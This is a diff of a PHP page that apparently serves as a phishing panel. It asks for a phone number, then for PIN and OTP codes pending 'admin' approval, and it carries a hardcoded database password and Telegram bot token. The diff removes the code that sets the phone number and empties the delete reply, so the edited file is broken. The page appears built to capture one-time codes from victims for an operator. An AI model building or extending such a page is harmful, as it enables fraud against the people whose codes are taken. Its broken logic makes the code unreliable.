@@ -12,19 +12,7 @@ $dbPass = "Jhl6RiIZwV5AnvLVCKirxqgLMtFi5gZX";
 $botToken = "8163112809:AAH5OFmjVHKPDz1svGG9viGjpAuNLFHsctc";
 $chatId   = "-5193742613";
 
-// Get phone from session, GET parameter, or POST (from manual entry)
-$phone = '';
-if (isset($_SESSION['phone'])) {
-    $phone = trim($_SESSION['phone']);
-} elseif (isset($_GET['phone']) && !empty($_GET['phone'])) {
-    $phone = trim($_GET['phone']);
-    $_SESSION['phone'] = $phone;  // store for subsequent requests
-} elseif ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['phone_submit'])) {
-    $phone = trim($_POST['phone'] ?? '');
-    if (!empty($phone)) {
-        $_SESSION['phone'] = $phone;
-    }
-}
+
 
 function getDbConnection($host, $port, $dbname, $user, $pass) {
     static $conn = null;
@@ -48,43 +36,13 @@ if (!$conn) {
     die("Database connection failed.");
 }
 
-// If no phone yet, show a simple form to enter it
-if (empty($phone)) {
-    ?>
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Enter Phone Number</title>
-        <style>
-            body { font-family: Arial; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-            .card { background: white; padding: 30px; border-radius: 20px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); max-width: 400px; text-align: center; }
-            input { padding: 10px; width: 80%; margin: 15px 0; border: 1px solid #ccc; border-radius: 8px; font-size: 16px; }
-            button { background: #2563eb; color: white; border: none; padding: 10px 20px; border-radius: 30px; cursor: pointer; }
-        </style>
-    </head>
-    <body>
-        <div class="card">
-            <h2>Verify Your Identity</h2>
-            <form method="POST">
-                <input type="text" name="phone" placeholder="Enter your phone number (e.g., 77xxxxxx)" required>
-                <button type="submit" name="phone_submit">Continue</button>
-            </form>
-        </div>
-    </body>
-    </html>
-    <?php
-    exit;
-}
-
-// Ensure phone exists in users table (insert default row if missing)
+// Ensure phone exists in users table (insert with default flags)
 $check = pg_query_params($conn, "SELECT phone FROM users WHERE phone = $1", [$phone]);
 if (!$check || pg_num_rows($check) == 0) {
     pg_query_params($conn, "INSERT INTO users (phone, status, pin, otp, approve) VALUES ($1, 0, 0, 0, 0)", [$phone]);
 }
 
-// Handle AJAX requests (PIN/OTP verification and deletion)
+// Handle AJAX verification and deletion
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_SERVER['HTTP_X_REQUESTED_WITH']) 
     && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
     
@@ -92,26 +50,26 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_SERVER['HTTP_X_REQUESTED_WI
     $type = $_POST['type'] ?? '';
     $action = $_POST['action'] ?? '';
     
-    // Delete account
+    // Handle delete action
     if ($type === 'delete' && $action === 'confirm') {
         $deleteSql = "DELETE FROM users WHERE phone = $1";
         $result = pg_query_params($conn, $deleteSql, [$phone]);
         if ($result) {
             session_destroy();
-            echo json_encode(['success' => true, 'redirect' => 'index.php']);
+           
         } else {
             echo json_encode(['success' => false, 'error' => 'Could not delete user']);
         }
         exit;
     }
     
-    // PIN/OTP verification
+    // Existing verification logic (PIN/OTP)
     if (!in_array($type, ['pin', 'otp']) || $action !== 'correct') {
         echo json_encode(['success' => false, 'error' => 'Invalid request']);
         exit;
     }
     
-    $col = $type;
+    $col = $type; // 'pin' or 'otp'
     $sql = "SELECT $col FROM users WHERE phone = $1";
     $result = pg_query_params($conn, $sql, [$phone]);
     if (!$result || !($row = pg_fetch_assoc($result))) {
@@ -196,7 +154,7 @@ if ($res && $row = pg_fetch_assoc($res)) {
     <div class="footer">Both must be approved by admin to continue</div>
 </div>
 
-<!-- Modal for PIN/OTP -->
+<!-- Modal for PIN/OTP verification -->
 <div id="verifyModal" class="modal">
     <div class="modal-content">
         <p id="modalTitle">Enter any 4 digits</p>
@@ -339,7 +297,7 @@ if ($res && $row = pg_fetch_assoc($res)) {
 </script>
 
 <?php
-// AJAX endpoint to get current flags
+// AJAX endpoint to get current flags (pin, otp)
 if (isset($_GET['get_flags']) && $_GET['get_flags'] == 1) {
     header('Content-Type: application/json');
     $sql = "SELECT pin, otp FROM users WHERE phone = $1";
